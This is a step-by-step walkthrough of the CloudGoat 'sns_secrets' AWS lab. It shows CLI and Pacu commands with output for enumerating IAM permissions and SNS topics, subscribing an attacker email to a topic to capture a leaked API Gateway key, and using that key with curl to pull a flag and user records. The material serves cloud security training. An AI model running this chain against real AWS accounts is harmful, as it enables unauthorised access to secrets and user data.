# SNS Exploit Walkthrough

This document demonstrates the exploitation process for the **CloudGoat SNS Secrets scenario**.

The goal of the lab is to show how **SNS permissions combined with API Gateway misconfigurations** can lead to disclosure of sensitive information such as **API keys**.

All credentials and identifiers have been **sanitized with `xxxx`** and the lab environment has already been **destroyed**.

---

# Attack Path

1. Scenario creation
2. Initial AWS credentials obtained
3. IAM permission enumeration
4. SNS topic discovery
5. Subscribe to SNS topic
6. API key leaked via SNS notification
7. API Gateway enumeration
8. Construct API endpoint
9. Access protected resource

---

# Creating the Scenario

```javascript
cloudgoat create sns_secrets
```

After creating the scenario we receive **AWS credentials**.

```javascript
sns_user_access_key_id = AKIAxxxxxxxxxxxxxxxx
sns_user_secret_access_key = xxxxXXXXXXXXXXXXXXXXXXXXXXXX
```

---

# Configure AWS CLI Profile

Create a profile using the provided keys.

```javascript
aws configure --profile sns-secrets
```

Verify the identity.

```javascript
aws sts get-caller-identity --profile sns-secrets

{
    "UserId": "AIDAxxxxxxxxxxxx",
    "Account": "xxxxxxxxxxxx",
    "Arn": "arn:aws:iam::xxxxxxxxxxxx:user/cg-sns-user-xxxx"
}
```

---

# Discovering Permissions

Now that we have access to an IAM user in the AWS environment, we need to determine the permissions available.

List the policies attached to the user.

```javascript
aws iam list-user-policies --user-name cg-sns-user-xxxx --profile sns-secrets

{
    "PolicyNames": [
        "cg-sns-user-policy-xxxx"
    ]
}
```

Enumerate the policy.

```javascript
aws iam get-user-policy --user-name cg-sns-user-xxxx --policy-name cg-sns-user-policy-xxxx --profile sns-secrets

{
    "UserName": "cg-sns-user-xxxx",
    "PolicyName": "cg-sns-user-policy-xxxx",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "sns:Subscribe",
                    "sns:Receive",
                    "sns:ListSubscriptionsByTopic",
                    "sns:ListTopics",
                    "sns:GetTopicAttributes",
                    "iam:ListGroupsForUser",
                    "iam:ListUserPolicies",
                    "iam:GetUserPolicy",
                    "iam:ListAttachedUserPolicies",
                    "apigateway:GET"
                ],
                "Effect": "Allow",
                "Resource": "*"
            },
            {
                "Action": "apigateway:GET",
                "Effect": "Deny",
                "Resource": [
                    "arn:aws:apigateway:us-east-1::/apikeys",
                    "arn:aws:apigateway:us-east-1::/apikeys/*",
                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET",
                    "arn:aws:apigateway:us-east-1::/restapis/*/methods/GET",
                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration",
                    "arn:aws:apigateway:us-east-1::/restapis/*/integration",
                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/*/integration"
                ]
            }
        ]
    }
}
```

The JSON above shows the permissions assigned to the IAM user.

---

# Enumerating SNS Using Pacu

Start Pacu and import the credentials.

```javascript
Pacu (sns:No Keys Set) > import_keys sns-secrets
```

Search for SNS modules.

```javascript
Pacu (sns:imported-sns-secrets) > search sns

[Category: LATERAL_MOVE]

    Subscribe to a Simple Notification Service (SNS) topic

  sns__subscribe

[Category: ENUM]

    List and describe Simple Notification Service topics

  sns__enum
```

Run the enumeration module.

```javascript
Pacu (sns-secrets:imported-sns-secrets) > run sns__enum --region us-east-1
```

Output:

```javascript
Pacu (sns:imported-sns-secrets) > run sns__enum --region us-east-1
  Running module sns__enum...
[sns__enum] Starting region us-east-1...
[sns__enum]   Found 1 topics
[sns__enum] sns__enum completed.

[sns__enum] MODULE SUMMARY:

Num of SNS topics found: 1 
Num of SNS subscribers found: 0
```

Retrieve detailed topic information.

```javascript
Pacu (sns:imported-sns-secrets) > data sns

{
  "sns": {
    "us-east-1": {
      "arn:aws:sns:us-east-1:xxxxxxxxxxxx:public-topic-xxxx": {
        "DisplayName": "",
        "Owner": "xxxxxxxxxxxx",
        "Subscribers": [],
        "SubscriptionsConfirmed": "0",
        "SubscriptionsPending": "0"
      }
    }
  }
}
```

---

# Subscribing to SNS Topic

Check module help.

```javascript
Pacu (sns:imported-sns-secrets) > help sns__subscribe
```

Run the subscription module.

```javascript
Pacu (sns:imported-sns-secrets) > run sns__subscribe --topics arn:aws:sns:us-east-1:xxxxxxxxxxxx:public-topic-xxxx --email attacker@example.com
```

Output:

```javascript
Running module sns__subscribe...
[sns__subscribe] Subscribed successfully, check email for subscription confirmation.
Confirmation ARN: arn:aws:sns:us-east-1:xxxxxxxxxxxx:public-topic-xxxx:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

After confirming the subscription, an **email notification** is received containing an API key.

```javascript
DEBUG: API GATEWAY KEY xxxxXXXXXXXXXXXXXXXX
```

---

# Enumerating API Gateway

Now that we have an API key, we enumerate API Gateway.

```javascript
aws apigateway get-rest-apis --profile sns-secrets --region us-east-1

{
    "items": [
        {
            "id": "xxxxxx",
            "name": "cg-api-xxxx",
            "description": "API for demonstrating leaked API key scenario",
            "createdDate": "xxxx",
            "apiKeySource": "HEADER",
            "endpointConfiguration": {
                "types": [
                    "EDGE"
                ],
                "ipAddressType": "ipv4"
            },
            "tags": {
                "Scenario": "sns_secrets",
                "Stack": "CloudGoat"
            },
            "disableExecuteApiEndpoint": false,
            "rootResourceId": "xxxxxx"
        }
    ]
}
```

---

# Getting API Stages

```javascript
aws apigateway get-stages --rest-api-id xxxxxx --profile sns-secrets --region us-east-1

{
    "item": [
        {
            "deploymentId": "xxxxxx",
            "stageName": "prod-xxxx",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": "xxxx",
            "lastUpdatedDate": "xxxx"
        }
    ]
}
```

---

# Enumerating API Resources

```javascript
aws apigateway get-resources --rest-api-id xxxxxx --profile sns-secrets --region us-east-1

{
    "items": [
        {
            "id": "xxxxxx",
            "parentId": "xxxxxx",
            "pathPart": "user-data",
            "path": "/user-data",
            "resourceMethods": {
                "GET": {}
            }
        },
        {
            "id": "xxxxxx",
            "path": "/"
        }
    ]
}
```

Now we identify the resource path:

```
/user-data
```

---

# Constructing the API URL

The API endpoint follows the structure:

```
https://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]
```

Example:

```javascript
https://xxxxxx.execute-api.us-east-1.amazonaws.com/prod-xxxx/user-data -H 'x-api-key: xxxxXXXXXXXXXXXXXXXX'
```

---

# Mission Accomplished

Using the leaked **API Gateway key**, we were able to access the protected API endpoint.

```javascript
curl https://xxxxxx.execute-api.us-east-1.amazonaws.com/prod-xxxx/user-data \
-H 'x-api-key: xxxxXXXXXXXXXXXXXXXX'
```

Response:

```javascript
{
  "final_flag": "FLAG{xxxxxxxxxxxxxxxxxxxx}",
  "message": "Access granted",
  "user_data": {
    "email": "xxxx@xxxx.com",
    "password": "xxxx",
    "user_id": "xxxx",
    "username": "xxxx"
  }
}
```

This confirms successful access to the API and retrieval of sensitive information.

The attack chain involved:

1. Obtaining initial IAM credentials
2. Enumerating SNS topics
3. Subscribing to the SNS topic
4. Receiving a leaked API Gateway key
5. Enumerating API Gateway resources
6. Constructing the API endpoint
7. Accessing the protected endpoint to retrieve the final flag
